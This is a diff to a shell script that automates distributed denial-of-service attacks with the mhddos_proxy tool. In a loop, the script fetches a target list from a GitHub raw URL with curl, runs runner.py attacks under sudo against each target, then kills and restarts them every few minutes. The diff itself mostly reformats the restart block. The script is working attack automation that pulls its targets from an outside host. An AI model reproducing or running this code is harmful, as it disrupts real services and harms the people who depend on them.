@@ -46,7 +46,7 @@ cd ~
 
 # Restart attacks and update targets list every 10 minutes (by default)
 while true
-echo -e "#####################################\n"
+#echo -e "#####################################\n"
 do
    # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos/main/runner_targets | cat | grep "^runner.py" | wc -l)
@@ -71,9 +71,10 @@ do
             cd ~/mhddos_proxy
             sudo python3 $cmd_line $proxy_interval $rpc
    done
-echo -e "#####################################\n"
-sleep $restart_interval
-echo -e "RESTARTING\n"
-sudo pkill -f ./start.py
-sudo pkill -f runner.py
+   echo -e "#####################################\n"
+   sleep $restart_interval
+   echo -e "RESTARTING\n"
+   sudo pkill -f ./start.py
+   sudo pkill -f runner.py
+
 done
